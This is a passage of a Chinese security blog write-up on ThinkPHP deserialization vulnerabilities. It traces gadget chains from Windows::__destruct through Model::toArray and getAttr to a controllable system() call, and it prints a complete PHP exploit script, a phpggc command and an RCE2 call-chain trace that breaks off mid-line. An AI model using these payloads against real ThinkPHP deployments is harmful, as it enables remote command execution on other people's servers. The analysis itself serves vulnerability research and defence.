class="comment">/**</span></span><br><span class="line"><span class="comment"> * 转换当前模型对象为JSON字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  integer $options json参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>Conversion::toArray</code> 方法中，我们通过设置 <code>$this-&gt;visible = null</code> 且 <code>$this-&gt;data</code> 不为空就可以调用到 <code>Attribute::getAttr</code> 方法，并且传入的参数是 <code>$this-&gt;data</code> 中的一个键。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 转换当前模型对象为数组</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为了确保 $hasVisible 为 false 不能进入这个循环，因此 $this-&gt;visible 为空</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">                <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并关联数据</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">            <span class="comment">// 进这个分支调用 Attribute::getAttr 方法</span></span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Attribute</code> 的函数会调用 <code>$closure</code> 函数变量，并且传入参数 <code>$value</code>。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取器 获取数据对象的值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name 名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  array  $item 数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="variable">$name</span>, &amp;<span class="variable">$item</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>); <span class="comment">// 取出 $this-&gt;data[$name]</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测属性获取器</span></span><br><span class="line">    <span class="variable">$fieldName</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>); <span class="comment">// 驼峰转下划线</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">        <span class="variable">$closure</span> = <span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>];</span><br><span class="line">        <span class="variable">$value</span>   = <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data); <span class="comment">// 🚨 可控闭包调用点</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>参数 <code>$value</code> 来自于 <code>$this-&gt;getData($name)</code>，<code>Attribute::getData</code> 会返回 <code>$this-&gt;data[$name]</code> 的值。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取对象原始数据 如果不存在指定字段返回false</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name 字段名 留空获取全部</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>]; <span class="comment">// 👈</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>函数 <code>$closure</code> 来自于 <code>$this-&gt;withAttr[$fieldName]</code>，而 <code>$fieldName</code> 来自于 <code>Loader::parseName($name)</code>。</p>
<p>函数 <code>Loader::parseName()</code> 是 ThinkPHP 中常见的 <strong>命名风格转换工具函数</strong>，用于在不同命名风格之间进行转换。因为参数 <code>$type</code> 没有设置，因此该函数按照默认的 <code>$type = 0</code> 将字符串从驼峰转换为下划线。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 字符串命名风格转换</span></span><br><span class="line"><span class="comment"> * type 0 将Java风格转换为C的风格 1 将C风格转换为Java的风格</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string  $name 字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  integer $type 转换类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  bool    $ucfirst 首字母是否大写（驼峰规则）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseName</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$type</span> = <span class="number">0</span>, <span class="variable">$ucfirst</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[A-Z]/&quot;</span>, <span class="string">&quot;_\\0&quot;</span>, <span class="variable">$name</span>), <span class="string">&quot;_&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>也就是说 <code>$closure</code> 和 <code>$value</code> 都是我们可控的，因此我们可以调用 <code>system</code> 函数执行命令。</p>
<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">data</span>, $<span class="title class_">withAttr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;smi1e&#x27;</span> =&gt; <span class="variable">$cmd</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&#x27;smi1e&#x27;</span> =&gt; <span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$cmd</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">payload</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>(&quot;<span class="title class_">calc</span>&quot;);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RCE2（影响-5-0-x）"><a href="#RCE2（影响-5-0-x）" class="headerlink" title="RCE2（影响 5.0.x）"></a>RCE2（影响 5.0.x）</h2><h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><ul>
<li><p><strong>影响范围</strong> ：5.0.24，其他 5.0.x 的版本也可以适用。</p>
</li>
<li><p><strong>生成命令</strong> ：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpggc ThinkPHP/RCE2 system <span class="built_in">id</span> -b -u</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>反序列化对象</strong> ：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/TPRCE2.svg"
                      alt="TPRCE2"
                ></p>
</li>
<li><p><strong>反序列化调用链</strong> ：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">think\process\pipes\Windows-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">└── <span class="title function_ invoke__">removeFiles</span>()</span><br><span class="line">    └── <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>)</span><br><span class="line">        └── <span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)                  <span class="comment">// ✅ 触发 __toString()</span></span><br><span class="line"></span><br><span class="line">think\model\Pivot-&gt;<span class="title function_ invoke__">__toString</span>()                     <span class="comment">// 从 Model 抽象类继承</span></span><br><span class="line">└── <span class="title function_ invoke__">toJson</span>()</span><br><span class="line">    └── <span class="title function_ invoke__">toArray</span>()</span><br><span class="line">        └── <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$name</span>)        <span class="comment">// ✅ 构造 $this-&gt;append = [&#x27;getError&#x27;]</span></span><br><span class="line">            └── <span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$name</span>)         <span class="comment">// ✅ getError 存在</span></span><br><span class="line">                └── <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>() <span class="comment">// ✅ 返回 HasOne 对象</span></span><br><span class="line">                └── <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>)</span><br><span class="line">                     └── <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> !== <span class="literal">null</span>                             <span class="comment">// ✅ Pivot-&gt;parent = Output</span></span><br><span class="line">                     └── !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>()                  <span class="comment">// ✅ HasOne-&gt;selfRelation = false</span></span><br><span class="line">                     └── <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>)</span><br><span class="line">                         └── <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>                           <span class="comment">// ✅ 返回 Output 对象</span></span><br><span class="line">                └── <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>()              <span class="comment">// ✅ 返回 [&#x27;no&#x27;]</span></span><br><span class="line">                     └── <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$attr</span>)</span><br><span class="line">                          └── <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>)                        <span class="comment">// ✅ Output 没有 getAttr，进入 __call()</span></span><br><span class="line"></span><br><span class="line">think\console\Output-&gt;<span class="title function_ invoke__">__call</span>(<span class="string">&quot;getAttr&quot;</span>, [<span class="string">&quot;no&quot;</span>])</span><br><span class="line">└── <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;styles))                  <span class="comment">// ✅ 构造 $this-&gt;styles = [&#x27;getAttr&#x27;]</span></span><br><span class="line">    └── <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$method</span>)                      <span class="comment">// ✅ $args = [&#x27;getAttr&#x27;, &#x27;no&#x27;]</span></span><br><span class="line">    └── <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;block&#x27;</span>], [<span class="string">&#x27;getAttr&#x27;</span>, <span class="string">&#x27;no&#x27;</span>])</span><br><span class="line">        └── <span class="title function_ invoke__">block</span>(<span class="string">&quot;getAttr&quot;</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">            └── <span class="title function_ invoke__">writeln</span>(<span class="string">&quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>)</span><br><span class="line">                └── <span class="title function_ invoke__">write</span>(<span class="string">&quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>, <span class="literal">true</span>, <span class="number">0</span>)</span><br><span class="line">                    └── <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>, <span class="literal">true</span>, <span class="number">0</span>)  <span class="comment">// ✅ $this-&gt;handle 为 Memcached</span></span><br><span class="line"></span><br><span class="line">think\session\driver\Memcached-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="variable">$expire</span>)</span><br><span class="line">└── <span class="variable">$sessID</span> = <span class="string">&quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>, <span class="variable">$sessData</span> = <span class="literal">true</span>, <span class="variable">$expire</span> = <span class="number">3600</span></span><br><span class="line">└── <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&quot;HEXENS&quot;</span> . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="variable">$expire</span>)</span><br><span class="line">     → <span class="title function_ invoke__">set</span>(<span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>, <span class="literal">true</span>, <span class="number">3600</span>)</span><br><span class="line"></span><br><span class="line">think\cache\driver\Memcache-&gt;<span class="title function_ invoke__">set</span>(<span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>, <span class="literal">true</span>, <span class="number">3600</span>)</span><br><span class="line">└── <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) → <span class="literal">false</span>                   <span class="comment">// ✅ $expire = 3600，不为空</span></span><br><span class="line">└── <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) → <span class="literal">false</span>       <span class="comment">// ✅ $expire 是整数，不是对象</span></span><br><span class="line">└── <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$name</span>))           <span class="comment">// ✅ $this-&gt;tag = true，执行 $this-&gt;has()</span></span><br><span class="line">    └── <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>)</span><br><span class="line">        └── <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>)         </span><br><span class="line">             → <span class="variable">$key</span> = <span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line">        └── <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>)</span><br><span class="line">            └── <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="variable">$name</span>       <span class="comment">// ✅ 默认 $this-&gt;options[&#x27;prefix&#x27;] = &#x27;&#x27;</span></span><br><span class="line">                └── <span class="variable">$key</span> = <span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>      <span class="comment">// ✅ 保持键名原样不变</span></span><br><span class="line">        └── <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>)                <span class="comment">// ✅ handler 是 think\Request 对象</span></span><br><span class="line"></span><br><span class="line">think\Request-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>)</span><br><span class="line">└── <span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;get, <span class="variable">$name</span> = <span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    └── <span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>) → <span class="literal">true</span></span><br><span class="line">         └── <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>)</span><br><span class="line">              └── <span class="variable">$name</span> = <span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;&quot;</span>                   <span class="comment">// ✅ &#x27;/&#x27; 被当作类型分隔符，保留 &#x27;&lt;&#x27;</span></span><br><span class="line">              └── <span class="variable">$type</span> = <span class="string">&quot;getAttr&gt;&quot;</span></span><br><span class="line">    └── <span class="keyword">foreach</span> (<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>))                           <span class="comment">// ✅ 无 &#x27;.&#x27;，单段字段</span></span><br><span class="line">         └── <span class="variable">$val</span> = <span class="string">&quot;HEXENS&lt;getAttr&gt;no&lt;&quot;</span></span><br><span class="line">         └── <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;get[<span class="variable">$val</span>]                           <span class="comment">// ✅ 命中键名，取出 &#x27;calc&#x27;</span></span><br><span class="line">              └── <span class="variable">$value</span> = <span class="string">&#x27;calc&#x27;</span></span><br><span class="line">    └── <span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>)</span><br><span class="line">         └── <span class="variable">$filter</span> = <span class="variable">$filter</span> ?: <span class="variable language_">$this</span>-&gt;filter = <span class="string">&#x27;system&#x27;</span>         <span class="comment">// ✅ 设置默认过滤器</span></span><br><span class="line">         └── <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$filter</span>) → [<span class="string">&#x27;system&#x27;</span>]                    <span class="comment">// ✅ 生成过滤器函数名数组</span></span><br><span class="line">         └── <span class="variable">$filter</span>[] = <span class="variable">$default</span> = <span class="literal">null</span>                           <span class="comment">// ✅ 最终 filters = [&#x27;system&#x27;, null]</span></span><br><span class="line">    └── <span class="variable">$filters</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="literal">null</span>]</span><br><span class="line">    └── <span class="title function_ invoke__">filterValue</span>(<span class="variable">$value</span> = <span class="string">&#x27;calc&#x27;</span>, <span class="variable">$key</span> = <span 